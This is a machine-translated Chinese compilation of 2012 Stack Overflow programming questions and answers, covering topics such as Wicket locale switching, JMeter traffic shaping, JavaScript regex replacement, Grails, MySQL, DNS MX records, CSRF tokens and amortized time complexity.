Link<Locale> changeLocaleLink = new Link<Locale>("link", locale) {
    @Override
    public void onClick() {
        Locale newLocale = getModelObject();
        // nothing esoteric done with setLocale(...) in MySession
        MySession session = MySession.get();

        session.setLocale(newLocale);
        if (session.isSignedIn()) {
            // set the new locale in the user's preferences
        }
        setResponsePage(getPage());
    }
}; 
```

使用 Wicket 1.5，这没有问题。页面重新加载，所有标签都相应更改。但是，由于我已将代码迁移到 Wicket 6.0，因此在更改区域设置时只有一些（看似随机的）标签会发生变化，所以我不知道是什么导致了问题。

我正在`ResourceModel`为我的所有标签使用 (Wicket-)standard 和资源文件。

请注意，使用：

```
setResponsePage(getPage().getClass()); 
```

和

```
setResponsePage(getPage().getClass(), getPage().getPageParameters()); 
```

对我不起作用，因为代码应该适用于所有页面，而且我有很多有状态的、不可标记的页面，它们的构造函数不遵循上述模式。

有人对 Wicket 6.0 有过同样的经历吗？

编辑：似乎大多数，但不是所有的`Link`s 标签都受到影响！此外，我没有看到发生这种情况时抛出任何异常。

EDIT2：由于 svenmeier 的要求，我做了更多的研究。所有未相应更新的链接的构造如下：

```
BookmarkablePageLink<MyPage> link 
    = new BookmarkablePageLink<MyPage>(ID, MyPage.class, params);
link.setBody(new ResourceModel("My.Internationalized.Text")); 
```

因此，链接组件似乎没有更新设置为主体模型的模型。这就留下了一个问题，为什么它确实适用于 Wicket 1.5。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-05T15:58:29.287

该问题已在 Wicket 6.1.0 中修复！[不幸的是，虽然WICKET-4738](https://issues.apache.org/jira/browse/WICKET-4738)听起来很像我的问题，但我不能说是哪个修复程序完成了这项工作。

# jmeter - JMeter 突发流量整形

> ID：12659865
> 
> 赞同：0
> 
> 时间：2012-09-30T08:33:25.710
> 
> 标签：jmeter, web-traffic, trafficshaping

我想为我的 webapp 运行以下测试：

*   客户端应该使用 T 个线程
*   客户端应每秒生成 R 个请求 (rps)。交通不应该**是**统一的。相反，请求应该以 X 项的突发生成，其中 X > R，并且每个突发都尽快发生。

因此，如果 T=40，X = 10,000 且 R = 200：

*   在 t0，客户端尝试使用 40 个线程尽可能快地发送 10,000 个请求。
*   成功发送前 10,000 个批次后，客户端等待直到 t1 = t0 + 50 秒 (X/R)。如果发送第一批的时间超过 50 秒，则会生成错误。
*   在 t1，客户端尝试发送下一个 10,000 批次等

这可以用现有的 JMeter 配置或插件来模拟吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T12:13:48.927

为什么不设置两组用户，一组设置为运行稳定的后台负载（您的 200 tps），另一组使用与您的突发速率相匹配的间隔，使用恒定吞吐量计时器设置。如果您将 Loop Controller 添加到突发组，则您可以在交错突发中生成大量呼叫。

然后你只需要根据需要设置循环和线程数。

# javascript - JavaScript 用其他单词替换文本中的任何单词

> ID：12659870
> 
> 赞同：0
> 
> 时间：2012-09-30T08:33:58.180
> 
> 标签：javascript, regex, firefox

既然回答了这个问题，我就把最简单的答案放在这里。（感谢贝尔吉）

首先确保所有特殊字符都在“useWord”中转义

```
useWord.replace(/([{}()[\]\\.?*+^$|=!:~-])/g, "\\$1"); 
```

然后像这样替换：

```
strIn.replace(new RexExp("\b"+userWord+"\b", "igm",replaceWord); 
```

最初的问题已得到回答，但由于我有时还需要用单词替换符号（如 $ 与 HKD），因此上述答案不起作用：

```
/\$/.test("10 $ ") = true
/\b\$\b/.test("10 $ ") = false 
```

更改了我的代码，因为那里有一个简单的错误：

```
([^A-Z]||^) 
```

应该

```
([^A-Z]|^) 
```

这里对代码进行详细说明：

用户可以指定一个词（=userWord 变量）和替换它的词（=replaceWord 变量）

例如：

usWord="博士";replaceWord="博士"

将单词 dr 替换为 Dr。

它需要不区分大小写，因此 DR,dR,Dr 和 dr 将替换为 Dr。问题是用户不了解正则表达式，因此需要转义“userWord”变量：（谢谢 Bergi）

```
userWord = userWord.replace(/([{}()[\]\\.?*+^$|=!:~-])/g, "\\$1"); 
```

现在我告诉 JavaScript 什么是“单词”，所以“驱动器”不会被替换，看起来像“Dr.ive”（编辑：原始代码是错误的，有 || 而不是 | 现在它已修复）

([^AZ]|^) 表示单词之前没有字母字符或单词位于行首。（“dream”和“drive”现在匹配，但不匹配“bandr”）

([^AZ]|$) 表示单词后没有字母字符或单词在行尾。（“梦想”和“驾驶”现在不再匹配了）

```
r=new RexExp("([^A-Z]|^)("+userWord+")([^A-Z]|$)","igm"); 
```

假设变量 strIn 是包含需要替换的单词的文本，那么现在我们可以开始替换：

```
strIn=strIn.replace(r,replaceWord); 
```

如果 strIn = "Julia 和 Ben 博士。" userWord="dr" 和 replaceWord="Dr." 那么输出是：

“朱莉娅和博士本。”

哎呀，我仍然不知道最简单的方法是不替换第一个和最后一个组（我保证明天会阅读正则表达式教程）。到目前为止我想出的解决方案是：

```
strIn=strIn.replace(r,function(a,b,c,d){
    return b + replaceWord + d;
}); 
```

这以前不起作用，因为我使用了 || 而不是 |

在我的应用程序中，userWord 和 replaceWord 不是一个单一的值，而是一个数组，但在这种情况下它并不重要。这是完整的代码（工作）感谢 Jim O'Brien 并为不同的组使用 $ 可以简化代码：

```
userWord="dr";
replaceWord="Dr.";
strIn="Julie was driving dr David."
userWord = userWord.
    .replace(/([{}()[\]\\.?*+^$|=!:~-])/g, "\\$1");
r=new RexExp("([^A-Z]|^)("+userWord+")([^A-Z]|$)","igm");
strIn=strIn.replace(r, "$1" + replaceWord + "$2");
return strIn; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T09:30:31.137

尝试使用[单词边界锚](http://www.regular-expressions.info/wordboundaries.html)：

```
var r = new RegExp("\b"+userWord+"\b", "ig");
return strIn.replace(r, replaceWord); 
```

此外，您的正则表达式转义并不完整。采用

```
userWord.replace(/([{}()[\]\\.?*+^$|=!:~-])/g, "\\$1"); 
```

（管道之后的最后几个或多或少是可选的，具体取决于您在正则表达式中使用转义字符串的位置）。

# android - 从 Android 中的本地资源读取 XML

> ID：12659871
> 
> 赞同：0
> 
> 时间：2012-09-30T08:34:18.427
> 
> 标签：android, xml-parsing

> **可能重复：**
> [Android：从本地资源读取 XML（用于测试）](https://stackoverflow.com/questions/5111735/android-reading-xml-from-local-resource-for-testing)

我在 Android 中有一个应用程序，它是从 XML 文件中读取类型的列表和 URL。在第一阶段，我应该从本地资源中读取这个 XML，在下一阶段，我应该从 Web 服务或其他东西中读取。这是 XML 文件：

```
<?xml version="1.0" encoding="UTF-8"?>
<genres>
    <genre>
        <id>1</id>    
        <title>Action</title>
        <count>5</count>
        <thumb_url>http://www.filmsite.org/images/action-genre.jpg</thumb_url>
    </genre>
    <genre>
        <id>2</id>    
        <title>Adventure</title>
        <count>12</count>
        <thumb_url>http://www.filmsite.org/images/adventure-genre.jpg</thumb_url>
    </genre>
    <genre>
        <id>3</id>    
        <title>Comedies</title>
        <count>54</count>
        <thumb_url>http://www.filmsite.org/images/comedy-genre.jpg</thumb_url>
    </genre>
    <genre>
        <id>4</id>    
        <title>Crime</title>
        <count>2</count>
        <thumb_url>http://www.filmsite.org/images/crime-genre.jpg</thumb_url>
    </genre>
    <genre>
        <id>5</id>    
        <title>Dramas</title>
        <count>3</count>
        <thumb_url>http://www.filmsite.org/images/drama-genre.jpg</thumb_url>
    </genre>
    <genre>
        <id>6</id>    
        <title>Epics</title>
        <count>1</count>
        <thumb_url>http://www.filmsite.org/images/epics-genre.jpg</thumb_url>
    </genre>
    <genre>
        <id>7</id>    
        <title>Horror</title>
        <count>0</count>
        <thumb_url>http://www.filmsite.org/images/horror-genre.jpg</thumb_url>
    </genre>
    <genre>
        <id>8</id>    
        <title>Musical</title>
        <count>0</count>
        <thumb_url>http://www.filmsite.org/images/musicals-genre.jpg</thumb_url>
    </genre>
    <genre>
        <id>9</id>    
        <title>Sci-fi</title>
        <count>5</count>
        <thumb_url>http://www.filmsite.org/images/scifi-genre.jpg</thumb_url>
    </genre>
    <genre>
        <id>10</id>    
        <title>War</title>
        <count>12</count>
        <thumb_url>http://www.filmsite.org/images/war-genre.jpg</thumb_url>
    </genre>
    <genre>
        <id>11</id>    
        <title>Westerns</title>
        <count>0</count>
        <thumb_url>http://www.filmsite.org/images/westerns-genre.jpg</thumb_url>
    </genre>
</genres>` 
```

首先我把这个 XML 放在 value 文件夹中，但它得到错误并说“无效的 XML”或其他东西。然后我用谷歌搜索了整个互联网，我发现我应该创建文件夹并将其命名为 row 然后将此文件放入 row 文件夹中，然后像这样导入它：

```
Xml.parse(getResources().openRawResource(R.raw.genres.xml), 
    Xml.Encoding.UTF_8, root.getContentHandler()); 
```

但是当我创建这个文件夹时，它会出错并且不起作用。而且，如果您关闭 Eclipse，它不会打开，直到您删除行文件夹。问题是我想从本地资源中读取 XML 文件，但我不知道将文件放在哪里以及如何快速读取和解析它。请帮我解决一下这个。非常感谢。

# grails - Grails 在预定义的表中引入了一个额外的列

> ID：12659872
> 
> 赞同：1
> 
> 时间：2012-09-30T08:34:26.413
> 
> 标签：grails, version, grails-orm, datagridviewcolumn

我刚开始 Grails 编程，我试图访问预定义并由其他应用程序访问的表，表仅包含 3 列 id、filename、msgcount。我通过 grails 成功连接并访问了表。直到这一切都很好，但是当我运行主应用程序时（以前是访问表）我遇到了一个错误，这是关于表属性不匹配的，所以我检查了表设计，发现有一个额外的列命名为“版本”。我对那个额外的列有点惊讶，但经过一些诊断后，我意识到该列是由 grails 应用程序添加的。

这种额外列的添加是否正常。是否有任何解决方案使 grails 应用程序不会更改表的属性（即添加额外的列），这可能会限制我们将同一个表用于多个应用程序。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:51:51.177

是的，这是 grails GORM 的默认行为。看到这个解释： http: [//grails.org/doc/latest/guide/GORM.html#optimisticLockingAndVersioning](http://grails.org/doc/latest/guide/GORM.html#optimisticLockingAndVersioning)

您可以通过两种方式解决它：

a）在您的数据库表中创建一个版本字段

或者

b) 您可以从您的域类中禁用版本字段，如下所示：

```
class YourDomainClass {

   static mapping = {
       version false
   }

   ...

} 
```

# ember.js - 如何从 Ember.js 存储库构建和预览最新文档

> ID：12659878
> 
> 赞同：6
> 
> 时间：2012-09-30T08:34:58.930
> 
> 标签：ember.js

我已经克隆了 Ember 存储库

```
git clone git://github.com/emberjs/ember.js.git 
```

然后导航到 ember.js 目录并运行`bundle`，然后我尝试

```
rake docs:build 
```

我收到这个错误

```
/home/zooby/.rvm/gems/ruby-1.9.3-p194@global/gems/rake-0.9.2.2/lib/rake/rake_module.rb:25: warning: redundant nested repeat operator
rake aborted!
Don't know how to build task 'docs:build' 
```

我尝试时遇到类似的错误

```
rake docs:preview 
```

我错过了什么？如何构建和查看 Ember 中可用文档的最新版本？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-30T09:11:59.743

*   您需要先安装[YUIDoc](http://yui.github.com/yuidoc/##install)。
*   然后`yuidocs`从**emberjs/docs**文件夹运行。
*   打开**emberjs/docs/build/index.html**，您就可以开始了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-07-20T05:34:26.983

运行`npm install && npm run docs`以构建 ember.js 文档。

之后你可以运行`ruby -run -e httpd docs -p 3000`访问[http://localhost:3000/的 ember api 文档](http://localhost:3000/)

# objective-c - 目标 C：方法和实例变量

> ID：12659882
> 
> 赞同：-1
> 
> 时间：2012-09-30T08:35:18.240
> 
> 标签：objective-c, xcode, methods, instance-variables

PrefMySpotsViewCtrl.h

```
@class Location;

@interface PrefMySpotsViewCtrl : NSViewController
{
  NSTextField *locationSearchInput;
  NSString * enteredLocation;

  Location *l;
}

@property (nonatomic, retain) IBOutlet NSTextField *locationSearchInput;
@property (nonatomic, retain) NSString *enteredLocation; 
```

PrefMySpotsViewCtrl.m

```
#import "Location.h"

- (void) controlTextDidChange:(NSNotification *)aNotification
{
   enteredLocation = [locationSearchInput stringValue];
   NSLog(@"in class:%@", enteredLocation);
   [l searchLocation];
} 
```

位置.h

```
@class PrefMySpotsViewCtrl;

@interface Location : NSObject

{
  PrefMySpotsViewCtrl *p;  
}

- (void) searchLocation; 
```

位置.m

```
#import "Location.h"
#import "PrefMySpotsViewCtrl.h"

@implementation Location

- (void) searchLocation
{
   NSLog(@"out of class: %@", [p enteredLocation]);
} 
```

用户输入 a `locationSearchInput`，这是输出

```
2012-09-30 10:18:12.915 MyApp[839:303] in class:
2012-09-30 10:18:12.917 MyApp[839:303] in class:a 
```

`searchLocation`方法永远不会执行。

如果我这样做`l = [[Location alloc] init];`，则`searchLocation`执行但输出为`null`

```
2012-09-30 10:28:46.928 MyApp[880:303] in class:
2012-09-30 10:28:46.929 MyApp[880:303] out of class: (null)
2012-09-30 10:28:46.930 MyApp[880:303] in class:a
2012-09-30 10:28:46.931 MyApp[880:303] out of class: (null) 
```

任何的想法？

谢谢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:42:39.933

但是，问题是：您是否为位置对象分配了一个有效的控制器实例（PrefMySpotsViewCtrl）？

我是说 ：

```
l = [[Location alloc] init];
l->p = self;
[l searchLocation]; 
```

请记住，最好将 PrefMySpotsViewCtrl 声明为 Location 声明中的属性，如下所示：

```
@interface Location : NSObject
{
  PrefMySpotsViewCtrl *p;  
}
@property (nonatomic, assign) PrefMySpotsViewCtrl *p; 
```

然后使用属性设置器分配它：

```
l = [[Location alloc] init];
l.p = self;
[l searchLocation]; 
```

**编辑**

由于从下面的评论看来 OP 不理解逻辑，我发布了一个简单的例子让他更好地理解：

1）A类声明：

```
@interface ClassA : NSObject
@property(nonatomic,retain) NSString *ABC;
@end 
```

2）B类声明：

```
@interface ClassB : NSObject 
@property(nonatomic,assign) ClassA *p;
-(void) printClassAvar;
@end

@implementation ClassB
-(void) printClassAvar {
    NSLog(@"Variable = %@", [self.p ABC]);
}
@end 
```

3) 用法：

```
ClassA *a = [ClassA new];
a.ABC = @"XZY";
ClassB *b = [ClassB new];
b.p = a;
[b printClassAvar]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T08:42:56.580

You haven't shown your init method.

It is possible that you haven't actually created an iVar for `l`. i.e something like:

```
// in the view controllers `initWithNibName:bundle:` method
l = [Location alloc] init]; // or whatever the inititializer for a Location object is. 
```

Because you haven't created an object of type `l` it is `nil` (with the newer LLVM compiler anyway), and it doesn't receeive messages, so your method is never called.

# mysql - Linux Mint 上 Xampp 中的 MySQL“停用”状态

> ID：12659891
> 
> 赞同：1
> 
> 时间：2012-09-30T08:37:34.600
> 
> 标签：mysql, xampp

当我开始我的服务时

```
/opt/lampp/lampp start 
```

当时就表明

```
Starting XAMPP for Linux 1.8.0…
XAMPP: Starting Apache with SSL (and PHP5)…
XAMPP: Another MySQL daemon is already running.
XAMPP: Starting ProFTPD…
XAMPP for Linux started. 
```

MySQL 没有运行。我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-17T10:42:02.893

我通过编辑以下行解决了这个问题`/opt/lampp/etc/my.cnf`。27 左右的行号 username 是您的 lampp 文件夹用户名或您要运行 mysql 的用户 `username= your-username`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-05T18:12:18.633

如果您使用的是 linux，请尝试以下命令

`cd /opt/lampp/phpmyadmin`

`sudo chmod o-rw config.inc.php`

资料来源：[Apachefriends 论坛](http://www.apachefriends.org/f/viewtopic.php?p=196640&sid=598c743686d9307dc859961fe7a87426)

# c++ - 如何在 QTreeWidgetItem 的坐标处弹出菜单？

> ID：12659894
> 
> 赞同：0
> 
> 时间：2012-09-30T08:38:19.703
> 
> 标签：c++, qt, contextmenu, coordinates, qtreewidget

在 QT 中：我创建了一个 QMenu：

```
QMenu* popMenu = new QMenu(ui->treeWidget); 
```

我想把它弹出到当前的treewidgetitem之上，但我只知道：

```
popMenu->exec(QCursor::pos()); 
```

所以如果我使用：

```
ui->treeWidget->setCurrentItem(treeWidgetItem);//this is necessary for my program and the current item will be used elsewhere. 
```

菜单将在鼠标单击的 pos 的 pos 上弹出，而不是在该项目上。这看起来很向导:(如何在当前项目的坐标处弹出菜单？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T12:46:20.803

我确定我的解决方案非常愚蠢，但它确实有效：我将根 QTreeWidgetItem 的高度测量为 15，将子 QTreeWidgetItem 的高度测量为 12。代码：

```
bool MainWindow::isAtItemPos()
{
    QPoint treeWidgetPos = ui->treeWidget->mapToGlobal(QPoint(0,0));
    QPoint curPos = QCursor::pos();
    int verPos = curPos.ry() - treeWidgetPos.ry();
    int verMax = 15 + 12*rootItem->childCount();
    if(verPos <= verMax)return true;
    else return false;
} 
```

我使用它：

```
if(isAtItemPos())popMenu->exec(QCursor::pos()); 
```

有用 ：）

# makefile - PCRE安装错误

> ID：12659895
> 
> 赞同：0
> 
> 时间：2012-09-30T08:38:23.270
> 
> 标签：makefile, pcre

[我从http://www.pcre.org](http://www.pcre.org)下载了最新版本的 PCRE 库，获得了一个 tar.gz 文件。我正在使用 Ubuntu 12.04.1。

然后我用

> gzip -d pcre- *NN* .tar.gz
> tar xvf pcre- *NN* .tar
> cd pcre- *NN*
> ./configure
> make

然后我得到这个错误

> libtool: compile: 无法识别的选项 `-DHAVE_CONFIG_H'
> libtool: compile: 尝试 `libtool --help' 获取更多信息。
> make[1]: *** [pcrecpp.lo] 错误 1

然后我发现*libtool*没有安装，所以

> sudo apt-get install libtool

但即使是现在，*make*也有同样的错误......

我该如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T08:47:21.693

我建议这样做。它安装了构建 pcre 所需的所有库

```
apt-get build-dep libpcre3-dev 
```

# mysql - mySQL：选择所有具有限制的列从计数中减去一

> ID：12659899
> 
> 赞同：0
> 
> 时间：2012-09-30T08:38:49.480
> 
> 标签：mysql, limit

我需要通过使用此代码从 10 个用户预订数据库中选择 9 行，但没有运气：

```
select count(id) as ids, * from booking_db where date between '2012-10-01' and '2012-10-10' limit 0, ids-1 
```

我用谷歌搜索，有人建议`LIMIT 1,9999999`<- 这也提供了 9 个结果，但不是需要在发票上登记的第一行。我期待第 1 天到第 9 天的结果。请提出建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T08:40:25.337

因为你已经设置了限制 0 为什么没有什么可以`limit 9`用来选择 9

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T08:44:00.497

如果要选择 9 列，则必须在选择中指定列名，*而不使用星号*：

```
SELECT count(id) as ids, col1, col2, col3, ...
FROM booking_db
WHERE date BETWEEN '2012-10-01' AND '2012-10-10'
GROUP BY col1, col2, col3, ... 
```

请注意，您还必须按这些列进行分组（使用 `GROUP BY 子句），但我相信这不是问题。

# email - 关于 MX 记录的困惑

> ID：12659907
> 
> 赞同：4
> 
> 时间：2012-09-30T08:40:16.303
> 
> 标签：email, dns, linode, mx-record

我对 DNS 记录的基础知识（在本例中为 MX 记录）感到非常困惑。现在我已经注册了一个域名（我们称之为example.com）。该域通过其名称服务器配置为我的 linode 的 IP。

域管理器中的默认 MX 记录是“mail.example.com”。很公平。

我遵循了关于设置 exim 服务器的教程。

[Linode 库中的 Exim 教程](http://library.linode.com/email/exim/send-only-mta-ubuntu-10.04-lucid)

我有点困惑。我在机器上的默认主机名是“antares”，因此 FQDN 是“antares.example.com”。在本教程中，我看不到“mail.example.com”是如何发挥作用的？我在哪里指定这个？或者我应该将邮件 MX 记录指向 antares.example.com？

我对 DNS 记录非常陌生，对邮件记录更是陌生。任何澄清我的误解的提示都是无价的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T08:47:06.960

默认情况下，您域的 DNS 服务器将为 Web 浏览器等提供 www 或 .domain.com 条目，但它实际上为其他服务托管一堆名称指针，其中一个是邮件交换。

需要您的 mx 记录值的服务知道如何从您的 DNS 服务器中查找它，因此在这种情况下，当您提供 domain.com 部分时，它们会找到 mail.domain.com。

如果您需要设置邮件服务器，则需要更改域管理器中的 mx 记录以指向您的机器 ip，这可能与您在同一域上的默认 www 主机名/ip 不同，因为可以提供每个服务由不同的主机（任何 ip）。

# jquery - 每个请求的反 CSRF 令牌

> ID：12659912
> 
> 赞同：0
> 
> 时间：2012-09-30T08:41:17.847
> 
> 标签：jquery, ajax, csrf

我有一个使用 jQuery/ajax 加载页面的 PHP 应用程序。我的问题是，我需要包含**每个请求的 ANTI CSRF Token**。

换句话说：当我发出第一个请求时，需要为下一个请求更新令牌。问题是：如何在表单的隐藏字段中设置新令牌？

我为令牌保留了一个公共隐藏字段，并考虑更改其值。但问题是：如何设置新的Token？

我不能在ajax中做到这一点。如果用户本身受到威胁，则 Token 失败。

这是示例代码

```
$key=md5(rand(1,9999).md5(date("Ymdhisu")).rand(1,9999));

$token=md5(getIpAddress().rand(1,9999).CM_SALT_CSRF);

$hash_key=$key.$token;

$hash_key=hash('sha512', $hash_key);

$session_key=$hash_key;

$_SESSION['CSRF_TOKEN']=$session_key;   

$_SESSION['KEY']=$key; 
```

然后我在隐藏字段中设置了 $token。

现在，在我使用 TOKEN 提交请求后，处理后将生成并设置一个新的 CSRF 令牌。由于它在 2.0 中，如何将新令牌值设置为隐藏字段？

如果我通过请求某些页面和 JavaScript 来设置新令牌，那么它也可以通过 CURL 来完成，对吗？

希望我清楚？？？

**编辑 1**

我的情况是，如果用户本身是黑客，使用假电子邮件 ID 创建假帐户怎么办。然后他/她可以在他/她在另一个选项卡中登录我的网站时，通过将引荐来源网址和其他标题字段伪造到我的网站来使用来自本地主机的 curl 请求。用户可以从 curl 响应中获取 csrf 令牌！？如果我错了，请纠正我。

# ipad - iPad 上的 Webapp 在新的 Safari 选项卡中打开 iFrame 的链接

> ID：12659925
> 
> 赞同：3
> 
> 时间：2012-09-30T08:42:57.670
> 
> 标签：ipad, web-applications, iframe, reporting-services

我正在为 iPad 开发一个小型 WebApp，以向 SSRS 的用户展示报告。我知道有像 MobiWave 这样的现有解决方案，但我的客户要求我开发一种更适合他的环境的解决方案。

所以我的问题如下。我正在将 SSRS 的内容加载到 iFrame 中并将其呈现给用户。现在，当我单击链接时，行为如下。在 Chrome 和 Safari Mobile（在 iPad 上）中，该站点按预期工作。当我运行与 webapp 相同的站点时，链接会在新的 safari 窗口中打开。我尝试了很多这样的解决方案[，](https://stackoverflow.com/questions/2898740/iphone-safari-web-app-opens-links-in-new-window)[但](https://gist.github.com/1042167)我没有按预期工作。

我的代码如下：

```
<!DOCTYPE html>
<html>
<head>
  <title> TEST </title>
  <link rel="stylesheet"  href="css/jquery.mobile-1.1.1.min.css" />
  <link rel="stylesheet" href="css/style.css" />
  <script src="js/jquery-1.7.1.min.js"></script>
  <script src="js/jquery.mobile-1.1.1.min.js"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">
  <link rel="apple-touch-icon" sizes="72x72" href="images/touch-icon-ipad.png" />
  <link rel="apple-touch-startup-image" href="images/startup.png">
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black" />
</head>
<body>
  <div data-role="page" id="home">
<div data-role="header">
      <ul data-role="controlgroup" data-type="horizontal" class="localnav">
    <li><a data-role="button" data-rel="back" data-icon="arrow-l">Back</a></li>
    <li><a href="./" data-role="button" data-icon="home" data-ajax="false">Home</a></li>
  </ul>
</div> 
<div id="content" data-role="content">
      <iframe src="../ReportServer"></iframe>
</div>
  </div>
</body>
</html> 
```

**编辑**

加载到 iFrame 的代码如下：

```
<html>
  <head>
    <meta name="Generator" content="Microsoft SQL Server Reporting Services, Version 10.50.1600.1">
    <title>localhost/ReportServer - /Reportings</title>
  </head>
<body><H1>localhost/ReportServer - /Reportings</H1><hr>
  <pre>
    <A HREF="http://localhost/ReportServer?&amp;rs%3ACommand=ListChildren">[In &#252;bergeordnetes Verzeichnis]</A>
    Donnerstag, 13\. September 2012 15:16        39033 <A HREF="?%2fReportings%2fReport1&amp;rs:Command=Render">Report1</A>
 </pre>
 <hr>
 Microsoft SQL Server Reporting Services, Version 10.50.1600.1
 </body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T08:55:48.120

哪些链接正在打开新选项卡、jqm 导航或报告服务报告内容？您的报表是作为完整的报表服务站点 Ui 加载的，还是直接链接到报表的基本呈现的报表服务器？

如果链接到报表的报表服务器版本，一个后备可能是呈现为 PDF 而不是 HTML。

考虑移除对 jQuery Mobile 的依赖，因为它会干扰正常的页面/点击事件。如果您计划构建更大的移动应用程序并且遇到 jQM 兼容性问题，您可能还想查看其他替代移动框架：

*   [http://enyojs.com/](http://enyojs.com/)
*   [http://www.sencha.com/products/touch](http://www.sencha.com/products/touch)
*   [http://www.kendoui.c​​om/mobile.aspx](http://www.kendoui.com/mobile.aspx)

# haskell - 使用 ghci 查找类型

> ID：12659927
> 
> 赞同：9
> 
> 时间：2012-09-30T08:43:41.693
> 
> 标签：haskell, ghci

当我在 ghci 中做一些简单的事情时，如下所示：

```
let x = 7 + 2 
```

我希望 ghci 给出 x 持有的类型的响应，例如：

```
x :: Integer 
```

当我运行 ghci 时，我没有得到上面的那一行。我如何得到这样的回应？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-09-30T09:06:44.133

要自动显示类型，请使用`:set +t`：

```
μ> :set +t
μ> let x = 7 + 2
x :: Integer
μ> 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-09-30T08:50:11.273

使用 ghci`:t`命令，如下所示：

```
Prelude> let x = 7 + 2
Prelude> :t x
x :: Integer
Prelude> 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-09-30T08:50:30.390

要在 GHCi 中查找某物的类型，您可以使用`:type`命令，或者（更常见）缩写为`:t`. 有了这个，您可以执行以下操作：

```
Prelude> let x = 7 + 2
Prelude> :t x
x :: Integer 
```

# big-o - 考试答案确认 - 摊销时间

> ID：12659931
> 
> 赞同：4
> 
> 时间：2012-09-30T08:44:09.730
> 
> 标签：big-o, time-complexity

下面的方法 op 属于一个具有两个私有整数值实例变量 n 和 counter 的类，它们都在构造函数中初始化为零值，随后仅由方法 op 修改。

```
public void op()
{
    if(counter<100)
    {
        op1(); //method with O(1) time complexity
        counter++;
    }else {
        op2(); //method with O(n^2) time complexity
        counter = 0;
    }
    n++;
} 
```

假设方法 op1 的时间复杂度为 O(1)，方法 op2 的时间复杂度为 O(n^2)，以下哪项最能代表方法 op 的摊销时间复杂度？

A) O(n)

B) O(n log n)

C) O(1)

**D) O(n^2)**

E) O(n3)

考试的答案是 D。我认为应该是 C，因为根据我对摊销时间的理解，您可以计算*大部分*时间会发生什么。在这种情况下，最坏的情况是 O(n^2)，但是大多数情况下算法将在 O(1) 中运行。为什么是 O(n^2)？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-09T20:21:10.963

在谈论摊销运行时，您**无法计算***大部分*时间会发生什么。首先，您如何定义*大多数时间*？操作的摊销运行时间可以看作是操作的平均运行时间。

## 现在解决您的问题：

为简单起见，我假设您写`if (counter < 99)`的是`if (counter < 100)`. 这样，操作会在 100 个周期后重复，而不是在 101 个周期后重复。

在写作`O(...)`时，在下文中，我的意思是`Θ(...)`，否则你的问题的答案将是微不足道的，因为一切都是`O(1)`如此`O(n^2)`。

调用`op()`100 次后，总运行时间为`99 + 100^2`.
调用`op()`200 次后，总运行时间为`2 * 99 + 100^2 + 200^2`.
现在让我们忘记那些`99`or `2 * 99`，因为它们受`n^2`价值观支配。
因此，在调用`op()` `n`时间之后，总运行时间将类似于`100^2 + 200^2 + ... + n^2`（为简单起见，我们假设它`n`可以被 整除`100`）。

现在我将证明这是在`O(n^3)`.

```
Let k = n/100

100^2 + 200^2 + ... + n^2
= 100^2 * (1^2 + 2^2 + ... + k^2)
=(*) O(100^2 * k * k^2)
= O(k^3)
= O(n^3)

(*): sum from 1 to k of i^2 is k (k+1) (2k+1) / 6 = O(k^3) 
```

所以最后，平均运行时间`op()`是`O(n^3 / n) = O(n^2)`. 因此，摊销运行时间`op()`为`O(n^2)`。

# javascript - 使用Javascript对购物车中的物品列表求和数量

> ID：12659939
> 
> 赞同：0
> 
> 时间：2012-09-30T08:47:08.620
> 
> 标签：javascript, arrays, shopping-cart

我正在尝试编写一小段 Javascript，它将对购物车中的项目列表进行排序，并确定每个品牌的数量总和是否为**12**的倍数。

购物车的一个例子是：

```
 - Brand 1 - Oranges ---------- Qty: 10
 - Brand 2 - Oranges ---------- Qty: 4
 - Brand 1 - Oranges ---------- Qty: 2
 - Brand 3 - Oranges ---------- Qty: 6
 - Brand 2 - Oranges ---------- Qty: 20 
```

因此总数为：`Brand 1 = 12`, `Brand 2 = 24`, `Brand 3 = 6`。

如果总数`Brand 1`或`Brand 2`不是**12**`Brand 3`的倍数（例如上面），我希望 Javascript 函数产生错误。**`Brand 3`**

 **我认为解决这个问题的最好方法是通过一个数组并以某种方式根据品牌对其进行拆分，然后将总数相加，但我不知道该怎么做。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T08:57:51.770

你需要两个循环，第一个是总结每个品牌的所有数量，第二个循环是检查所有总和是否是 12 的倍数。

你可以在这里找到一个例子：http: [//jsfiddle.net/5QGWG/](http://jsfiddle.net/5QGWG/)**

# iphone - 具有水平过渡的模态搜索

> ID：12659945
> 
> 赞同：1
> 
> 时间：2012-09-30T08:48:52.417
> 
> 标签：iphone, ios5, modal-dialog, transition, segue

我正在使用模态 segue 从一个 VC 传递到另一个。我想使用水平过渡而不是像默认过渡那样垂直。我该怎么做 ？

# c++ - 为什么在运行尺寸 [6, 10, 14, ...] 时此代码会中止

> ID：12659946
> 
> 赞同：1
> 
> 时间：2012-09-30T08:49:04.053
> 
> 标签：c++, sigabrt, sieve-of-eratosthenes

